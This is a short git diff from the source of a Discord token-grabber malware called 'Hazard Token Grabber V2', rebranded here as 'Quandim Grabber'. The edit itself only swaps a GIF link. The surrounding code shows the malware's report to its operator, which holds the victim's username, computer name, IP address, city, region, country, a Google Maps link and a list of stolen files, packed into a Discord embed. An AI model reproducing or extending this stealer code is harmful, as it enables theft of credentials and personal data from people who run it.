@@ -343,13 +343,13 @@ class Hazard_Token_Grabber_V2:
                     "author": {
                         "name": "Quandim Grabber",
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
-                        "icon_url": "https://cdn.discordapp.com/attachments/915705104043216956/929804854556229632/eda543f9793331b2e77f2ac6842ccd7c.gif"
+                        "icon_url": "https://cdn.discordapp.com/attachments/915705104043216956/929857842737979452/tenor.gif"
                     },
                     "description": f"**{os.getlogin()}** Just ran Quandim Grabber\nID: **User[{num}]**\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                     "color": 2123412,
 
                     "thumbnail": {
-                      "url": "https://cdn.discordapp.com/attachments/915705104043216956/929804854556229632/eda543f9793331b2e77f2ac6842ccd7c.gif"
+                      "url": "https://cdn.discordapp.com/attachments/915705104043216956/929857842737979452/tenor.gif"
                     },       
 
                     "footer": {
